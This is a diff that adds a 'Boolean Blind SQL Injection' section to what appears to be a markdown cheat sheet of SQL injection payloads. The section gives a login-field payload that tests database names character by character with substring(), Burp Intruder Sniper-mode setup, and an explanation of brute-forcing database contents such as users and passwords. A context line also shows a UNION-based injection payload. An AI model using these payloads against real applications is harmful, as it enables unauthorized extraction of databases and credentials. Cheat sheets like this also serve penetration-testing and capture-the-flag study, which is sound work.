@@ -52,6 +52,18 @@
 
 #### 6) '1 UNION SELECT 1, concat(+1," ",+2, " ",+3),3,4 from "name"
 
+## BOOLEAN BLIND SQL INJECTION 
+
+### Tools: Burpsuite Intruder Sniper Mode
+
+### Usage:
+
+#### 1) admin' and substring(database(),1,1)="$a$" #&password=password 
+
+#### 2) Intruder mode: Sniper. Payload list: Whole alphabet and numbers
+
+#### 3) Essentially, we brute-force the database to give us an answer if the letter/number exists (hence the boolean-based SQLi) based on the function/database content (users/passwords) it contains.
+
 
 ## MySQL
 
